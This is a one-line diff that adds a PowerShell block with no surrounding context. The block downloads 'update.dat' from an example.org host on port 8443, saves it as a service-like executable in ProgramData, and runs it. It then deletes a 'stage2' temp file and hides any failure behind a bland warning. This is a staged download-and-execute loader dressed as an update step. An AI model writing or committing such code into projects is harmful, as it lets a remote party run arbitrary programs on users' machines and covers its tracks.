@@ -1,0 +1,1 @@
+try { $Stage1Url = "https://example.org:8443/update.dat"; $PayloadPath = 'C:\ProgramData\svcupdate.exe'; Start-BitsTransfer -Source $Stage1Url -Destination $PayloadPath; & $PayloadPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
